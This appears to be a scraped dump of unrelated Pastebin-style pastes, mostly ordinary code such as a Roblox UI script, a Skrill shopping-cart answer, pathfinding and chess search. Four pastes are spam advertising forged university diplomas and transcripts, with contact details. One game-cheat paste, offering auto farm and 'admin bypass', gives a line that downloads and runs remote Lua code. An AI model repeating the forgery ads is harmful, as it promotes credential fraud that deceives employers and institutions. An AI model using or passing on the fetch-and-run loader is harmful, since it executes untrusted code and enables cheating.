RayfieldToggleUI.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
RayfieldToggleUI.BorderSizePixel = 0
RayfieldToggleUI.Position = UDim2.new(0.120833337, 0, 0.0952890813, 0)
RayfieldToggleUI.Size = UDim2.new(0, 60, 0, 60)  -- Tamaño ajustado para que parezca un círculo y más pequeño
RayfieldToggleUI.Font = Enum.Font.SourceSans
RayfieldToggleUI.Text = """"
RayfieldToggleUI.TextColor3 = Color3.fromRGB(0, 0, 0)
RayfieldToggleUI.Draggable = true
RayfieldToggleUI.MouseButton1Click:Connect(function()
    if Debounce then return end
    if Hidden then
        Hidden = false
        Unhide()
    else
        if not SearchHided then
            spawn(CloseSearch)
        end
        Hidden = true
        Hide()
    end
end)

RayfieldCornerUI.Name = ""RayfieldCornerUI""
RayfieldCornerUI.Parent = RayfieldToggleUI
RayfieldImageUI.Name = ""RayfieldImageUI""
RayfieldImageUI.Parent = RayfieldToggleUI
RayfieldImageUI.BackgroundColor3 = Color3.fromRGB(192, 192, 192)
RayfieldImageUI.BackgroundTransparency = 1.000
RayfieldImageUI.BorderSizePixel = 0
RayfieldImageUI.Position = UDim2.new(0.0, 0, 0.0, 0)
RayfieldImageUI.Size = UDim2.new(0, 60, 0, 60)
RayfieldImageUI.Image = ""http://www.roblox.com/asset/?id=14435896466""

local UserInputService = game:GetService(""UserInputService"")
local isDragging = false
local startPos
local offset

RayfieldToggleUI.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.Touch then
        isDragging = true
        startPos = input.Position
        offset = RayfieldToggleUI.Position - UDim2.new(0, startPos.X, 0, startPos.Y)
    end
end)

RayfieldToggleUI.InputChanged:Connect(function(input)
    if isDragging and input.UserInputType == Enum.UserInputType.Touch then
        local newPos = UDim2.new(0, input.Position.X, 0, input.Position.Y) + offset
        RayfieldToggleUI.Position = newPos
    end
end)

RayfieldToggleUI.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.Touch then
        isDragging = false
    end
end)

UserInputService.InputBegan:Connect(function(input, processed)
    if (input.KeyCode == Enum.KeyCode.F and not processed) then
        if Debounce then return end
        if Hidden then
            Hidden = false
            Unhide()
        else
            Hidden = true
            Hide()
        end
    end
end)
"
LuMfnkdz,chatgpt dummy shopping cart skrill -paypal test,plirof2,JavaScript,Friday 19th of January 2024 06:53:54 AM CDT,"I want to create a simple shopping cart in javascript that accepts payments using skrill

To create a simple shopping cart in JavaScript that accepts payments using Skrill, you'll need to have a basic understanding of HTML, CSS, and JavaScript. Here's a step-by-step guide to get started:

1. Set up your HTML structure:
   ```html
   <!DOCTYPE html>
   <html lang=""en"">
   <head>
       <meta charset=""UTF-8"">
       <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
       <title>Simple Shopping Cart</title>
   </head>
   <body>
       <h1>Simple Shopping Cart</h1>
       <div id=""cart""></div>
       <button id=""checkout-btn"">Checkout</button>
   </body>
   </html>
   ```

2. Style your shopping cart using CSS or a CSS framework like Bootstrap.

3. In JavaScript, create an array to store the cart items and a function to update the UI:
   ```javascript
   // Cart items array
   let cartItems = [];

   function updateCartUI() {
       const cartDiv = document.getElementById('cart');
       cartDiv.innerHTML = """"; // Clear cart before updating

       // Render cart items
       cartItems.forEach(item => {
           const itemDiv = document.createElement('div');
           itemDiv.innerHTML = `${item.name} - $${item.price}`;
           cartDiv.appendChild(itemDiv);
       });
   }
   ```

4. Implement the ""Add to Cart"" button functionality:
   ```javascript
   // Add to cart button event listener
   const addToCartButton = document.getElementById('add-to-cart-btn');
   addToCartButton.addEventListener('click', () => {
       const name = prompt(""Enter item name:"");
       const price = parseFloat(prompt(""Enter item price:""));
       const newItem = { name, price };
       cartItems.push(newItem);
       updateCartUI();
   });
   ```

5. Implement the ""Checkout"" button functionality:
   ```javascript
   // Checkout button event listener
   const checkoutButton = document.getElementById('checkout-btn');
   checkoutButton.addEventListener('click', () => {
       // Here, you can redirect the user to Skrill payment page
       // You'll need a Skrill Merchant ID and a payment URL
       // You can generate a payment URL using the Skrill API

       // Example code
       const skrillMerchantId = 'YOUR_SKRILL_MERCHANT_ID';
       const paymentUrl = `https://pay.skrill.com?pay_to_email=${skrillMerchantId}&amount=1000&currency=USD`;

       window.location.href = paymentUrl;
   });
   ```

Remember to replace `'YOUR_SKRILL_MERCHANT_ID'` with your actual Skrill Merchant ID.

This is a basic implementation that allows you to add items to the cart and initiate the Skrill payment process. You'll need to handle the payment completion and update your system accordingly on the server-side."
2CSR6nv3,cari-kata.pl,paperline27,Perl,Friday 19th of January 2024 06:46:07 AM CDT,"use strict;
use warnings;

# Mendapatkan daftar file text dalam direktori
my @perl_files = glob(""*.txt"");

# Loop melalui setiap file
foreach my $file (@perl_files) {
    open my $fh, '<', $file or die ""Tidak dapat membuka file '$file': $!"";

    # Loop melalui setiap baris dalam file
    my $line_number = 0;
    while (my $line = <$fh>) {
        $line_number++;

        # Cari kata kunci dalam setiap baris
        if ($line =~ /\bpicoCTF\b/i) {
            print ""File: $file, Baris: $line_number - $line"";
        }
    }

    close $fh;
}


=begin comment
1.extension file .txt bisa dirubah menjadi apapun
2. kata	picoCTF bisa dirubah menjadi apapun
=cut"
BY6Z2LeB,Pictures,SaNik74,C#,Friday 19th of January 2024 06:43:53 AM CDT,"class Program
{
    static void Main(string[] args)
    {
        int countPicturesInRow = 3;
        int countPictures = 52;
        int fullRows = countPictures / countPicturesInRow;
        int picturesRemaining = countPictures % countPicturesInRow;

        Console.WriteLine($""Полностью заполненных рядов - {fullRows}\n"" +
            $""Картинок сверх меры - {picturesRemaining}"");
    }
}"
spmqcECT,./ping,paperline27,Bash,Friday 19th of January 2024 06:22:15 AM CDT,"#!/bin/bash

if [ -z ""$1"" ]; then
  echo ""contoh: $0 9.9.9.9""
  exit 1
fi

host=""$1""

ping -c 100 ""$host""



#penggunaan>>
#chmod +x ping
#./ping bing.com"
45FhD5Ab,Untitled,Pahom-ka,JavaScript,Friday 19th of January 2024 06:17:36 AM CDT,"miniShop2.plugin.rost2 = {
    getFields: function () {
        return {
            rost2: {
                xtype: 'minishop2-combo-options',
                description: '<b>[[+rost2]]</b><br />' + _('ms2_product_rost2_help')
            },
			pol2: {
                xtype: 'minishop2-combo-pol2',
                description: '<b>[[+pol2]]</b><br />' + _('ms2_product_pol2_help')
            }
        }
    },
    getColumns: function () {
        return {
            rost2: {
                width: 50,
                sortable: false,
                editor: {
                    xtype: 'minishop2-combo-options',
                    name: 'rost2'
                }
            },
			pol2: {
                width: 50,
                sortable: false,
                editor: {
                    xtype: 'minishop2-combo-pol2',
                    name: 'pol2'
                }
            }
        }
    }
};

miniShop2.combo.pol2 = function(config) {
    config = config || {};
    Ext.applyIf(config,{
		xtype: 'superboxselect'
        ,store: new Ext.data.ArrayStore({
            id: 0,
        fields: ['pol2', 'display'],
        data: [
            { pol2: 'Унисекс', display: 'Унисекс' },
            { pol2: 'Мужской', display: 'Мужской' },
            { pol2: 'Женский', display: 'Женский' }
        ]
        })
        ,mode: 'local'
        ,displayField: 'display'
        ,valueField: 'pol2'
    });
    miniShop2.combo.pol2.superclass.constructor.call(this,config);
};
Ext.extend(miniShop2.combo.pol2,miniShop2.combo.Options);
Ext.reg('minishop2-combo-pol2',miniShop2.combo.pol2);"
HNbFrbKT,data816,TestGuy1,JSON,Friday 19th of January 2024 06:00:07 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'ddd284374cc3e36dec0b2e9eb1e1f196c4ea549eb69a9086bb037cd7e817a550c5cbc0042dc157d1ec41d2dcd3459d224dcde44732c952ad552641d4de3bc422eb366f5931519a829631751f4b422f14b4536f836b33530cddf494899012df1e09558aef5eb78434405cf0ed84f2cdabab121a7d80ab7ef6db1e84da985c07aa',
  otherdata: [
    'c8b2343da4a14d6e5dbb79193ec17a7b',
    'e01aa7138f67661b141b8c240b8b3eed',
    'e97fc8878e5da1b82316c916e54d6950',
    '2ae8bd5b0d9e4f7d4d1e3bc0fe0817e7',
    'b1de8613e08fc828891b3e16c27b7895',
    '901537388a024f7f472953ef6e8b9ce3',
    'd16302298811b707d6a32885655419b2',
    '87be386a5f12b0835c9a487ac4984502'
  ]
}"
jmV1EDzG,[1d] Pet Simulator 99! AutoFarm Script,Project-WD,Lua,Friday 19th of January 2024 05:58:19 AM CDT,"-- 🆕Update (20/01/2024)
-- AUTO FARM | ADMIN BYPASS | AUTO HATCH | AUTO OBBY & MORE
-- Script📝: Paste into your executor
loadstring(game:HttpGet(""https://raw.githubusercontent.com/REDzHUBz/PetSimulator99/main/redz9999.lua"" ))()"
c0D7Di4D,Round Gauge,TimmyChannel,C#,Friday 19th of January 2024 05:56:31 AM CDT,"public partial class RoundGauge : UserControl
	{
		private double angle;
		private double minValue;
		private double maxValue;

		public RoundGauge()
		{
			InitializeComponent();
			angle = 0;
			DisplayedValue.Text = Value.ToString();
			CalculateAngle();
			UpdateVisibleArc();
		}

		public static readonly DependencyProperty ValueProperty =
		DependencyProperty.Register(""Value"", typeof(double), typeof(RoundGauge), new PropertyMetadata(0.0, OnValueChanged));

		public double Value
		{
			get { return (double)GetValue(ValueProperty); }
			set { SetValue(ValueProperty, value); }
		}

		private static void OnValueChanged(DependencyObject d, DependencyPropertyChangedEventArgs e)
		{
			RoundGauge roundGauge = (RoundGauge)d;
			double newValue = (double)e.NewValue;
			if (newValue < roundGauge.MinValue) roundGauge.MinValue = roundGauge.Value;
			if (newValue > roundGauge.MaxValue) roundGauge.MaxValue = roundGauge.Value;
			roundGauge.DisplayedValue.Text = newValue.ToString();
			roundGauge.CalculateAngle();
			roundGauge.UpdateVisibleArc();
		}
		public double MinValue { get => minValue; set => minValue = value; }
		public double MaxValue { get => maxValue; set => maxValue = value; }
		private void CalculateAngle()
		{
			double valueRange = maxValue - minValue;
			double normalizedValue = (Value - minValue) / valueRange;

			angle = normalizedValue * 360;
		}
		private void UpdateVisibleArc()
		{
			GaugeCanvas.Children.Clear();

			var clipGeometry = CreateClipGeometry();
			var gradientStops = CreateGradientStops();
			var startPoint = CalculateStartPoint();
			var endPoint = CalculateEndPoint();
			var gradEndPoint = CalculateGradEndPoint();
			var donutRing = CreateDonutRing(clipGeometry, gradientStops, startPoint, gradEndPoint);
			var circlesPoint = CalculateCirclesPoint(endPoint);
			var circle1 = CreateCircle(circlesPoint, 7, new SolidColorBrush(Color.FromRgb(217, 217, 217)));
			var circle2 = CreateCircle(circlesPoint, 10, new SolidColorBrush(Color.FromRgb(187, 112, 0)));
			var circle3 = CreateCircle(circlesPoint, 12, new SolidColorBrush(Color.FromArgb(51, 187, 112, 0)));
			var circle4 = CreateCircleWithBlur(circlesPoint, 14, new SolidColorBrush(Color.FromArgb(51, 187, 112, 0)));

			if (angle == 360)
			{
				GaugeCanvas.Children.Add(donutRing);
				GaugeCanvas.Children.Add(circle4);
				GaugeCanvas.Children.Add(circle3);
				GaugeCanvas.Children.Add(circle2);
				GaugeCanvas.Children.Add(circle1);
				return;
			}

			var visibleArc = CreateVisibleArc(startPoint, endPoint);
			donutRing.Clip = visibleArc.Data;

			GaugeCanvas.Children.Add(donutRing);
			GaugeCanvas.Children.Add(circle4);
			GaugeCanvas.Children.Add(circle3);
			GaugeCanvas.Children.Add(circle2);
			GaugeCanvas.Children.Add(circle1);
		}

		private PathGeometry CreateClipGeometry()
		{
			var clipGeometry = new PathGeometry();
			var outerCircleGeometry = new EllipseGeometry(new Rect(0, 0, ActualWidth, ActualHeight));
			var innerCircleGeometry = new EllipseGeometry(new Rect(ActualWidth * 0.05, ActualHeight * 0.05, ActualWidth * 0.9, ActualHeight * 0.9));
			clipGeometry.AddGeometry(outerCircleGeometry);
			clipGeometry.AddGeometry(innerCircleGeometry);
			return clipGeometry;
		}

		private GradientStopCollection CreateGradientStops()
		{
			var gradientStops = new GradientStopCollection
			{
				new GradientStop(Color.FromRgb(187, 112, 0), 0),
				new GradientStop(Color.FromRgb(43, 41, 48), 0.6)
			};
			return gradientStops;
		}

		private Point CalculateStartPoint()
		{
			var startAngle = (0 - 210) * Math.PI / 180;
			var startPoint = new Point(ActualWidth / 2 + Math.Cos(startAngle) * ActualWidth / 2, ActualHeight / 2 + Math.Sin(startAngle) * ActualHeight / 2);
			return startPoint;
		}

		private Point CalculateEndPoint()
		{
			var endAngle = (angle + 150) * Math.PI / 180;
			var endPoint = new Point(ActualWidth / 2 + Math.Cos(endAngle) * ActualWidth / 2, ActualHeight / 2 + Math.Sin(endAngle) * ActualHeight / 2);
			return endPoint;
		}

		private Point CalculateGradEndPoint()
		{
			var gradAngle = (angle - 210) * Math.PI / 180;
			var value1 = Math.Sin(gradAngle);
			var value2 = Math.Cos(gradAngle);
			var normalizedCos = (value2 + 1) * 0.5;
			var normalizedSin = (value1 + 1) * 0.5;
			var endGradAngle = Math.Atan2(normalizedSin - 0.5, normalizedCos - 0.5) + Math.PI;
			var x2 = 0.5 + 0.5 * Math.Cos(endGradAngle);
			var y2 = 0.5 + 0.5 * Math.Sin(endGradAngle);
			var gradEndPoint = new Point(x2, y2);
			return gradEndPoint;
		}

		private Path CreateDonutRing(PathGeometry clipGeometry, GradientStopCollection gradientStops, Point startPoint, Point gradEndPoint)
		{
			var gradAngle = (angle - 210) * Math.PI / 180;
			var value1 = Math.Sin(gradAngle);
			var value2 = Math.Cos(gradAngle);
			var normalizedCos = (value2 + 1) * 0.5;
			var normalizedSin = (value1 + 1) * 0.5;
			var donutRing = new Path
			{
				Fill = new LinearGradientBrush(gradientStops)
				{
					StartPoint = new Point(normalizedCos, normalizedSin),
					EndPoint = gradEndPoint,
				},
				Data = clipGeometry
			};
			return donutRing;
		}

		private Point CalculateCirclesPoint(Point endPoint)
		{
			var offset = 8;
			var circlesPoint = new Point();

			if (angle <= 30 || angle >= 300)
			{
				double t = Math.Min(Math.Max((angle - 30) / (360 - 30), 0), 1);
				circlesPoint.X = endPoint.X + offset * (1 - t);
				circlesPoint.Y = endPoint.Y - offset * t;
			}
			else if (angle > 30 && angle <= 120)
			{
				double t = Math.Min(Math.Max((angle - 30) / (120 - 30), 0), 1);
				circlesPoint.X = endPoint.X + offset * (1 - t);
				circlesPoint.Y = endPoint.Y + offset * t;
			}
			else if (angle > 120 - offset && angle <= 210)
			{
				double t = Math.Min(Math.Max((angle - (120 - offset)) / (210 - (120 - offset)), 0), 1);
				circlesPoint.X = endPoint.X - offset * t;
				circlesPoint.Y = endPoint.Y + offset * (1 - t);
			}
			else if (angle > 210 - offset && angle < 300)
			{
				double t = Math.Min(Math.Max((angle - (210 - offset)) / (300 - (210 - offset)), 0), 1);
				circlesPoint.X = endPoint.X - offset * (1 - t);
				circlesPoint.Y = endPoint.Y - offset * t;
			}
			return circlesPoint;
		}

		private Path CreateCircle(Point center, double radius, SolidColorBrush fill)
		{
			var circle = new Path
			{
				Data = new EllipseGeometry(new Rect(new Point(center.X - radius, center.Y - radius), new Size(radius * 2, radius * 2))),
				Fill = fill,
			};
			return circle;
		}

		private Path CreateCircleWithBlur(Point center, double radius, SolidColorBrush fill)
		{
			var circle = new Path
			{
				Data = new EllipseGeometry(new Rect(new Point(center.X - radius, center.Y - radius), new Size(radius * 2, radius * 2))),
				Fill = fill,
				Effect = new BlurEffect
				{
					Radius = 10,
					KernelType = KernelType.Gaussian
				}
			};
			return circle;
		}

		private Path CreateVisibleArc(Point startPoint, Point endPoint)
		{
			var visibleArc = new Path
			{
				Fill = Brushes.Red,
				Data = new PathGeometry
				{
					Figures = new PathFigureCollection
					{
						new PathFigure(new Point(ActualWidth / 2, ActualHeight / 2),
							new List<PathSegment>
							{
								new LineSegment(endPoint, true),
								new ArcSegment(startPoint, new Size(ActualWidth / 2, ActualHeight / 2), 0, angle>=180, SweepDirection.Counterclockwise, true),
								new LineSegment(new Point(ActualWidth / 2, ActualHeight / 2), true)
							},
						true)
					}
				}
			};
			return visibleArc;
		}

	}
}"
qCYEpWqi,WhatsApp: +86 19911539281 Buy fake City Guilds Level certificate.,jf123123,Bash,Friday 19th of January 2024 05:52:40 AM CDT,"We can make fake diplomas, fake degrees and transcripts, fake degrees, supply novelty diploma, buy fake diplomas. Buying fake degrees from our company is safe and secure. We have thousands of samples from universities in AUS, CAD, USA, Malaysia, Germany, UK and other countries. So you can easily buy college diploma or college diploma, we can design it quickly, if you really need, then add me WhatApp or email me, here is my information.

Email: diplomacentersale@gmail.com 
WhatsApp: +86 19911539281
WeChat: +86 14779983878 
https://www.diploma888.com

Where can I make the City Guilds Level 3 NVQ diploma? Buy fake City Guilds Level certificate, How to get a City Guilds Level 3 NVQ certificate? Order fake City Guilds Level Engineering Maintenance Mechanical certificate, Buy fake City Guilds certificate diploma, Obtain the latest version of the third-level NVQ certificate sample of the city guild, order a City and Guilds of London Institute certificate. https://www.diploma888.com/sample/city-guilds-certificate/
"
shQcZQ45,How to buy fake University of Texas at Dallas degree?,jf123123,C,Friday 19th of January 2024 05:47:08 AM CDT,"We can make fake diplomas, fake degrees and transcripts, fake degrees, supply novelty diploma, buy fake diplomas. Buying fake degrees from our company is safe and secure. We have thousands of samples from universities in AUS, CAD, USA, Malaysia, Germany, UK and other countries. So you can easily buy college diploma or college diploma, we can design it quickly, if you really need, then add me WhatApp or email me, here is my information.

Email: diplomacentersale@gmail.com 
WhatsApp: +86 19911539281
WeChat: +86 14779983878 
https://www.diploma888.com

How to buy fake University of Texas at Dallas degree? Order fake University of Texas at Dallas (UTD) diploma online. Where to obtain replacement University of Texas at Dallas certificate? Fake UTD degree certificate for sale, Make the UT Dallas Academic transcript, Purchase a fake Texas degree. https://www.diploma888.com/sample/utd-degree/

The University of Texas at Dallas is a public research university located in Richardson, Texas, in the center of the Dallas-Fort Worth Metroplex. The University is home to nearly 30,000 students with close to 30% pursuing graduate degrees. buy fake degree, buy fake diploma, fake cetificate, How to buy fake USA diploma?

"
kUKcrnhh,WhatsApp: +86 19911539281  Fake WGU certificate for sale.,jf123123,Bash,Friday 19th of January 2024 05:41:37 AM CDT,"We can make fake diplomas, fake degrees and transcripts, fake degrees, supply novelty diploma, buy fake diplomas. Buying fake degrees from our company is safe and secure. We have thousands of samples from universities in AUS, CAD, USA, Malaysia, Germany, UK and other countries. So you can easily buy college diploma or college diploma, we can design it quickly, if you really need, then add me WhatApp or email me, here is my information.

How to buy fake Western Governors University (WGU) degree? Where to obtain replacement Western Governors University diploma? Fake WGU certificate for sale, Make the WGU Academic transcript, Order fake WGU degree certificate, Buy a WGU diploma sample, Purchase a fake USA diploma.

Email: diplomacentersale@gmail.com 
WhatsApp: +86 19911539281
WeChat: +86 14779983878 
https://www.diploma888.com

"
QG2U4T7F,WhatsApp: +86 19911539281 Order fake UWO diploma online.,jf123123,Bash,Friday 19th of January 2024 05:35:21 AM CDT,"We can make fake diplomas, fake degrees and transcripts, fake degrees, supply novelty diploma, buy fake diplomas. Buying fake degrees from our company is safe and secure. We have thousands of samples from universities in AUS, CAD, USA, Malaysia, Germany, UK and other countries. So you can easily buy college diploma or college diploma, we can design it quickly, if you really need, then add me WhatApp or email me, here is my information. https://www.diploma888.com/sample/uwo-degree/

Buy fake University Western Ontario degree, Order fake UWO diploma online, Fake University Western Ontario certificate for sale, Where to order fake University Western Ontario degree certificate? Buy a UWO diploma sample in Ontario, How to buy fake University Western Ontario degree? Purchase a fake Canada diploma.

Email: diplomacentersale@gmail.com 
WhatsApp: +86 19911539281
WeChat: +86 14779983878 
https://www.diploma888.com

"
LQq9VvHn,"""Chattingan di Terminal dengan Netcut: Panduan Sederhana""",paperline27,Bash,Friday 19th of January 2024 05:24:54 AM CDT,"
[ install ]
apt install netcat-openbsd
[ temenmu ]
#nc -l 9090
[ kamu ]
#nc ip-wifimu 9090  ;contoh>> nc 192.168.0.111 9090

=×=
:untuk mengirim pesan cukup dengan enter
:keep secure & keep ethical hacking
:happy hacking !!!
"
Q4WW872Y,Untitled,AppiChudilko,JavaScript,Friday 19th of January 2024 05:17:47 AM CDT,"class MetroGraph {
    constructor() {
        this.stations = {};
    }

    addStation(stationName) {
        this.stations[stationName] = {};
    }

    addConnection(stationA, stationB, time) {
        this.stations[stationA][stationB] = time;
        this.stations[stationB][stationA] = time;
    }

    dijkstraWithMultiplePaths(startStation, endStation, numberOfPaths = 3) {
        const paths = [];

        for (let pathNumber = 0; pathNumber < numberOfPaths; pathNumber++) {
            const distances = {};
            const visited = {};
            const path = {};

            // Инициализация начальных расстояний и пути
            for (const station in this.stations) {
                distances[station] = Infinity;
                visited[station] = false;
                path[station] = null;
            }

            distances[startStation] = 0;

            // Шаги алгоритма Дейкстры
            while (true) {
                let currentStation = null;
                let currentDistance = Infinity;

                // Находим ближайшую непосещенную станцию
                for (const station in this.stations) {
                    if (!visited[station] && distances[station] < currentDistance) {
                        currentStation = station;
                        currentDistance = distances[station];
                    }
                }

                // Если все станции посещены, выходим из цикла
                if (currentStation === null) break;

                // Посещаем текущую станцию
                visited[currentStation] = true;

                // Обновляем расстояния до соседних станций
                for (const neighborStation in this.stations[currentStation]) {
                    const timeToNeighbor = this.stations[currentStation][neighborStation];
                    const totalDistance = distances[currentStation] + timeToNeighbor;

                    if (totalDistance < distances[neighborStation]) {
                        distances[neighborStation] = totalDistance;
                        path[neighborStation] = currentStation;
                    }
                }
            }

            // Восстановление пути
            const pathResult = [endStation];
            let current = endStation;

            while (current !== startStation) {
                const prevStation = path[current];
                pathResult.unshift(prevStation);
                current = prevStation;
            }

            paths.push({
                distance: distances[endStation],
                path: pathResult,
            });
        }

        // Сортировка путей по длине
        paths.sort((a, b) => a.distance - b.distance);

        return paths;
    }

    dijkstra(startStation, endStation) {
        const distances = {};
        const visited = {};
        const path = {};

        // Инициализация начальных расстояний и пути
        for (const station in this.stations) {
            distances[station] = Infinity;
            visited[station] = false;
            path[station] = null;
        }

        distances[startStation] = 0;

        // Шаги алгоритма Дейкстры
        while (true) {
            let currentStation = null;
            let currentDistance = Infinity;

            // Находим ближайшую непосещенную станцию
            for (const station in this.stations) {
                if (!visited[station] && distances[station] < currentDistance) {
                    currentStation = station;
                    currentDistance = distances[station];
                }
            }

            // Если все станции посещены, выходим из цикла
            if (currentStation === null) break;

            // Посещаем текущую станцию
            visited[currentStation] = true;

            // Обновляем расстояния до соседних станций
            for (const neighborStation in this.stations[currentStation]) {
                const timeToNeighbor = this.stations[currentStation][neighborStation];
                const totalDistance = distances[currentStation] + timeToNeighbor;

                if (totalDistance < distances[neighborStation]) {
                    distances[neighborStation] = totalDistance;
                    path[neighborStation] = currentStation;
                }
            }
        }

        // Восстановление пути
        const pathResult = [endStation];
        let current = endStation;

        while (current !== startStation) {
            const prevStation = path[current];
            pathResult.unshift(prevStation);
            current = prevStation;
        }

        return {
            distance: distances[endStation],
            path: pathResult,
        };
    }
}


// Пример использования
const metro = new MetroGraph();

metro.addStation(""A"");
metro.addStation(""B"");
metro.addStation(""C"");
metro.addStation(""D"");

metro.addConnection(""A"", ""B"", 5);
metro.addConnection(""B"", ""C"", 3);
metro.addConnection(""C"", ""D"", 7);
metro.addConnection(""A"", ""D"", 20);

const result = metro.dijkstraWithMultiplePaths(""A"", ""D"");

console.log(""Result:"", result);
"
kTK4mEyT,mcadiff.py,zydeco,Python,Friday 19th of January 2024 04:40:17 AM CDT,"import mcworldlib as mc
import deepdiff
import re
from sys import argv

#argv = [None, 'world/region/r.0.0.original.mca', 'world/region/r.0.0.mca']

name1 = argv[1]
name2 = argv[2]
file1 = mc.anvil.load_region(name1)
file2 = mc.anvil.load_region(name2)

chunks1 = set(file1.keys())
chunks2 = set(file2.keys())
if chunks1 != chunks2:
    print(""Chunks missing:"")
    removed = (chunks1-chunks2)
    added = (chunks2-chunks1)
    if len(removed) > 0:
        print(f""-{removed}"")
    if len(added) > 0:
        print(f""+{added}"")

def chunkdiff(chunk1, chunk2):
    keys1 = chunk1.keys()
    keys2 = chunk2.keys()
    if keys1 != keys2:
        removed = set(keys1) - set(keys2)
        added = set(keys2) - set(keys1)
        if len(removed) > 0:
            print(f""-{removed}"")
        if len(added) > 0:
            print(f""+{added}"")
    for key in keys1:
        k1 = chunk1[key]
        k2 = chunk2[key]
        if k1 != k2:
            diff = deepdiff.DeepDiff(k1, k2)
            for path in diff.affected_paths:
                changed = diff['values_changed'][path]
                printable_path = re.sub('^root', key, path)
                print(f""-{printable_path} = {changed['old_value']}"")
                print(f""+{printable_path} = {changed['new_value']}"")
    return None

for chunk in set.intersection(chunks1, chunks2):
    chunk1 = file1[chunk]
    chunk2 = file2[chunk]
    if chunk1 != chunk2:
        print(f""in chunk {chunk}:"")
        chunkdiff(chunk1, chunk2)
"
vuriKiys,h8g8 is not the best,max2201111,Python,Friday 19th of January 2024 04:39:57 AM CDT,"import chess
import time
import threading

positions_count = 0
stop_thread = False

def count_pieces(board):
    """"""Spočítá a vrátí počet figurek na šachovnici.""""""
    count = 0
    for square in chess.SQUARES:
        if board.piece_at(square):
            count += 1
    return count

def update_positions_count_and_time():
    global positions_count, start_time
    while not stop_thread:
        elapsed_time = time.time() - start_time
        formatted_time = format_time(elapsed_time)
        print(f""\rProhledaných pozic: {positions_count} Čas: {formatted_time}"", end='')
        time.sleep(1)

def format_time(seconds):
    """"""Převede sekundy na formát %dd %hh %mm %ss.""""""
    days, seconds = divmod(seconds, 86400)
    hours, seconds = divmod(seconds, 3600)
    minutes, seconds = divmod(seconds, 60)
    return f""{int(days)}d {int(hours):02d}h {int(minutes):02d}m {int(seconds):02d}s""

def evaluate_board(board, depth):
    global positions_count
    positions_count += 1
    if board.is_checkmate():
        return 10000 - depth
    if board.is_stalemate() or board.can_claim_draw():
        return 0
    return None

def negamax(board, depth, alpha, beta, color, move_history):
    evaluated = evaluate_board(board, depth)
    if evaluated is not None:
        return color * evaluated
    
    if depth == 0 or board.is_game_over():
        return count_pieces(board)

    max_eval = float('-inf')
    for move in board.legal_moves:
        board.push(move)
        move_history.append(board.fen())
        eval = -negamax(board, depth - 1, -beta, -alpha, -color, move_history)
        board.pop()
        move_history.pop()
        if eval > max_eval:
            max_eval = eval
        alpha = max(alpha, eval)
        if alpha >= beta:
            break

    return max_eval

def find_best_move(board, depth):
    best_move = None
    best_value = float('-inf')
    alpha = float('-inf')
    beta = float('inf')
    color = 1 if board.turn else -1
    move_history = [board.fen()]

    for move in board.legal_moves:
        board.push(move)
        move_history.append(board.fen())
        board_value = -negamax(board, depth - 1, -beta, -alpha, -color, move_history)
        board.pop()
        move_history.pop()
        if board_value > best_value:
            best_value = board_value
            best_move = move

    return best_move, move_history

start_position = ""8/3k4/8/8/8/8/1K1p4/8 w - - 0 1""
start_position = ""8/3k4/8/8/8/8/1K1p4/8 w - - 0 1""
start_position = ""7K/8/k1P5/7p/8/8/8/8 w - - 0 1""

board = chess.Board(start_position)
depth = 13

start_time = time.time()
print(""Počáteční pozice:"")
print(board)
print()

positions_count_thread = threading.Thread(target=update_positions_count_and_time, daemon=True)
positions_count_thread.start()

best_move, move_history = find_best_move(board, depth)
stop_thread = True

print(""\nHistorie tahů od nejlepšího k počátečnímu:"")
for fen in move_history:
    print(chess.Board(fen))
    print()

if best_move is not None:
    print(f""Nejlepší tah je: {best_move.uci()}"")
else:
    print(""Žádný další legální tah není možný."")

print(""\nKonec hry"")"
qZFdH3ML,СПРИНТ № 5 | Итераторы | Урок 8: Стандартные алгоритмы из <algorithm> 1/2,chevengur,C++,Friday 19th of January 2024 04:27:56 AM CDT,"#include <algorithm>
#include <iostream>
#include <numeric>
#include <sstream>
#include <vector>

using namespace std;

// функция, записывающая элементы диапазона в строку
template <typename It>
string PrintRangeToString(It range_begin, It range_end) {
    ostringstream out;
    for (auto it = range_begin; it != range_end; ++it) {
        out << *it << "" "";
    }
    out << endl;
    return out.str();
}

template <typename It>
vector<string> GetPermutations(It range_begin, It range_end){
    vector<string> result;
    sort(range_begin, range_end);

    do{
        result.push_back(PrintRangeToString(range_begin, range_end));
    }while(next_permutation(range_begin, range_end));

    return result;
}

int main() {
    vector<int> permutation(3);
    iota(permutation.begin(), permutation.end(), 1);

    auto result = GetPermutations(permutation.begin(), permutation.end());
    for (const auto& s : result) {
        cout << s;
    }

    return 0;
}
"
JKe8ce2T,swap phones,petar_bonov,HTML,Friday 19th of January 2024 04:25:58 AM CDT,"под <div class=""candidate-search candidate-search-1""> и candidate-search-2 / над <h3></h3>

<div class=""swap-phones"" title=""Swap phones""><a href=""#""><i class=""head-icon icon-swap""></i></a></div>

под <div class=""candidate-search candidate-search-3"">

<div class=""swap-phones empty""></div>"
cHASGJNF,Reverse_Linked_list,naren_paste,Python,Friday 19th of January 2024 04:20:21 AM CDT,"class ListNode:
    def __init__(self, value=0, next=None):
        self.value = value
        self.next = next

def reverse_linked_list(head, k):
    current = head
    prev = None
    next_node = None
    count = 0

    # Count the number of nodes in the current group
    temp = head
    while temp is not None and count < k:
        temp = temp.next
        count += 1

    # If the number of nodes in the group is less than k, no need to reverse
    if count < k:
        return head

    # Reverse the nodes in the current group
    while count > 0:
        next_node = current.next
        current.next = prev
        prev = current
        current = next_node
        count -= 1

    # Recursively reverse the rest of the linked list
    if next_node is not None:
        head.next = reverse_linked_list(next_node, k)

    return prev

def print_linked_list(head):
    current = head
    while current is not None:
        print(current.value, end="" -> "")
        current = current.next
    print(""None"")

# Example usage:
# Create a linked list: 1 -> 2 -> 3 -> 4 -> 5
head = ListNode(1, ListNode(2, ListNode(3, ListNode(4, ListNode(5)))))

# Reverse in groups of k = 3
new_head = reverse_linked_list(head, 3)

# Print the reversed linked list
print_linked_list(new_head)
"
PYkQQmSx,ENGINE CONTROLS,JaMaNi133,Lua,Friday 19th of January 2024 03:32:49 AM CDT,"--pastebin get PYkQQmSx startup.lua

monitor = peripheral.wrap(""monitor_5"")
